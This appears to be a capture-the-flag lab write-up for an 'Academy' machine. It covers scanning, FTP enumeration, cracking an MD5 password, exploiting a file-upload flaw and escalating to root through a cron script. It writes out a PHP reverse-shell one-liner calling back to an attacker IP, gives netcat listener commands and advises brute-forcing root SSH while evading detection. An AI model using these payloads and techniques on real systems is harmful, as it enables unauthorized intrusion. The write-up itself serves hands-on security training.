First of all set up academy on your VM ware

![](https://i.imgur.com/sqlEL3g.png)

Now use the logs `root:tcm` and you should be logged in successfully, Once logged in you can use the command `dhclient` followed by `ip a` to check for machine ip address

![](https://i.imgur.com/oVlP40y.png)

Time to run our Nmap scan on targets, first of all directly SSH to the target using the host system to make things easier for us to interact with the Machine instead of clicking VM Ware always

![](https://i.imgur.com/cTGXvph.png)

![](https://i.imgur.com/aGx2Ruw.png)

If you have problems connecting, Make sure to set network to bridge then run `dhclient` before `ip a` 

Running our Nmap scan , Query `nmap -p- -sCV 192.168.0.108 -v --min-rate=1000 -T4 -oN nmap_academy.txt`

![](https://i.imgur.com/v6wqzFu.png)

## Enumeration

> Usually in CTF's we erase enumerating port 22/SSH out of the board, cos' we don't usually go through that route except we find a valid username and start brute forcing for passwords, But in real-world scenario, You should brute force ssh using `root` as username and seeing if the account uses a weak credential, also try to see if you can bypass detection, like trying to log in over 500 attempts without getting detected, that is a security risk you should add to your reports


**Starting with FTP** 

We have anonymous login on FTP, so let start out with that, Remember nmap told us we have `anonymous` login with a `note.txt`

![](https://i.imgur.com/SHmlC7f.png)

Checking what the note.txt has, give us this 

![](https://i.imgur.com/MRhguMj.png)

Nice !!!, `cd73502828457d15655bbd7a63fb0bc8` , looks like a password though "Learn SQL😆" , but stored in MD5, you can use `hash-identifier` to check it out in kali , soo we will be cracking it using `john-the-ripper`  

![](https://i.imgur.com/BeXT0EU.png)

We got the password which is `student` , we need to try it out somewhere so since we found port 80/HTTP , let check it out

![](https://i.imgur.com/5hsUFWn.png)

We have a default Apache web page, trying out directory bruteforce gives us `academy` and `phpmyadmin` 

![](https://i.imgur.com/jnxSiyX.png)

Checking out `/academy` we have a login page, using the credentials we got `10201321:student` we were successfully logged in

![](https://i.imgur.com/MX9LNyp.png)

Navigating the websites i found a file upload vulnerability on `/academy/my-profile.php`

![](https://i.imgur.com/ORgyyqB.png)

We can upload our PHP reverse shell file, Get one from https://www.revshells.com/ , save it in a file with the `.php` extension and upload it as an image file, but before we do that start a netcat listener with `nc -lvnp 1337` , then go ahead with uploading the PHP file 

![](https://i.imgur.com/iS3YC7v.png)

Now paste in your reverse shell payload on the execute bar, i will be using `php -r '$sock=fsockopen("192.168.0.157",1337);exec("/bin/bash <&3 >&3 2>&3");'` for my payload, after pasting these you should get a connection on your terminal

![](https://i.imgur.com/xG9ZJFD.png)

Great, we got shell back as `www-data` so we need to do privilege escalation 

![](https://i.imgur.com/BoFJmdz.png)

We will be using `Linpeas.sh` for this lab, you can transfer it to the target system by using python and wget , also make sure to grant executable permissions and run with `./linpeas.sh`

![](https://i.imgur.com/X80fXIh.png)

We found a `backup.sh` folder on the home user `grimmie` but don't have write access to the file,  let keep hunting 

![](https://i.imgur.com/v4Tg06s.png)

![](https://i.imgur.com/gDzx9tR.png)

We definitely need a way to pivot to `grimmie` cos' user `grimmie` has a file in it home directory running as cron job, so we need to pivot to `grimmie` first then root

![](https://i.imgur.com/BaM9Dzy.png)

Looks like we have stored passwords somewhere, With this we can definitely escalate to `grimmie`

![](https://i.imgur.com/AEgi8Jd.png)

Using the find command i looked for where this password is located inside a file `find /var -type f -exec grep -l "My_V3ryS3cur3_P4ss" {} \;` , it was located under the `/var/www/html/academy/admin/includes/config.php` file

![](https://i.imgur.com/kEPayI7.png)

![](https://i.imgur.com/RK5Jhcp.png)

We can login using SSH, once logged in we can escalate privileges using the `backup.sh` file by editing it

![](https://i.imgur.com/MNkh58n.png)

![](https://i.imgur.com/hS6S34A.png)

We can see that this file is removing a zipped backup file and then somehow unzipping it to `/../../../../include` then granting it `r-w-x` execute permissions, let edit this file, i would replace all this with a bash reverse shell , so anytime the cron job runs it give me back a shell as `root`

![](https://i.imgur.com/24ZRCpY.png)

We got root successfully 🥳

![](https://i.imgur.com/ULfumcp.png)







